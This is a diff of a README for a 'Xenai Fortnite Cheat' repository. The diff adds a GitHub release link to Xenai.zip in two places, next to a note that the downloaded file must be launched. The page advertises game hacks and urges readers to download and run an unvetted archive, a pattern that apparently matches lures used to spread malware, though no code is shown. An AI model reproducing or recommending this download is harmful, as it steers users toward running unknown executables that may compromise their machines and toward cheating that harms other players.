@@ -7,7 +7,7 @@ Welcome to the "Xenai Fortnite Cheat" repository, your one-stop destination for 
 Topics: Not provided
 
 ## Software Download
-🔗 [Xenai.zip - Click here to download]()  
+🔗 [Xenai.zip - Click here to download](github.com/Flixx12/Xenai-Fortnite-Cheat/releases/download/Xenai/Xenai.zip)  
 (*Note: The downloaded file needs to be launched.*)
 
 ## 🌟 Ready to Dominate Fortnite? 🌟
@@ -32,4 +32,4 @@ Stay updated on the latest hacks and cheats by following us on Twitter and Insta
 
 Looking for more exciting features and hacks? Check out the "Releases" section for the latest updates and releases.
 
-[![Download Xenai](https://img.shields.io/badge/Download-Software-blue)]()
+[![Download Xenai](https://img.shields.io/badge/Download-Software-blue)](github.com/Flixx12/Xenai-Fortnite-Cheat/releases/download/Xenai/Xenai.zip)
